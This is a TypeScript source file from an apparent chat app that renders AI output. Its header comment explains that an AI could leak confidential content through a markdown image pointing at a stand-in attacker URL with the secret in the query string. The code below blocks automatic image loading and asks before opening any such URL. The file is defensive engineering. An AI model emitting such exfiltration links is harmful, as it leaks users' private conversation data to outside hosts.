// Images in AI chat output are never loaded.
//
// An AI that has read confidential content can emit `![](https://attacker/?q=<secret>)`;
// rendering that as <img> makes the app fetch the URL on its own, with no click, and the
// secret leaves the machine in the query string. So a markdown image in a chat message is
// rendered as text naming its URL. Clicking it asks first and then opens the URL in the
// external browser — a deliberate, visible action instead of an automatic request.
//
// Raw HTML (`<img src=...>`) is covered separately: the chat renderer passes `skipHtml`
// and never uses rehype-raw, so HTML tags in the message are dropped, not rendered.

import { openInBrowser } from '../../features/chat/api'

/** Only plain web URLs may be handed to the external browser. */
export function isOpenableImageUrl(src: string | undefined): src is string {
  if (!src) return false
  try {
    const url = new URL(src)
    return url.protocol === 'https:' || url.protocol === 'http:'
  } catch {
    return false
  }
}

export function remoteImageConfirmMessage(url: string): string {
  return `外部サイトの画像をブラウザで開きます。\n\n${url}\n\nURLに会話の内容が含まれている可能性があります。開いてよいですか？`
}

export async function openRemoteImage(
  url: string,
  deps: {
    confirm: (message: string) => boolean
    openExternal: (url: string) => Promise<unknown>
  } = {
    confirm: (message) => window.confirm(message),
    openExternal: (target) => openInBrowser(target),
  },
): Promise<boolean> {
  if (!isOpenableImageUrl(url)) return false
  if (!deps.confirm(remoteImageConfirmMessage(url))) return false
  await deps.openExternal(url)
  return true
}
